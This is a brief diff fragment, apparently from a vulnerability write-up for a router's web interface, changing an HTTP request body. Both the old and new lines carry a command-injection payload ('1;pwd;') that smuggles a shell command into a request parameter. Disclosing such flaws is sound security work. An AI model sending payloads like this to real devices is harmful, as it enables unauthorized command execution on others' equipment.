@@ -33,6 +33,6 @@ Connection: close
 Referer: http://192.168.0.254
 Cookie: session=562230006
 
-page=ping_test&CCMD=4&pingIp=1;pwd;
+page=set_sys_cmd&command=1;pwd;
 ```
 
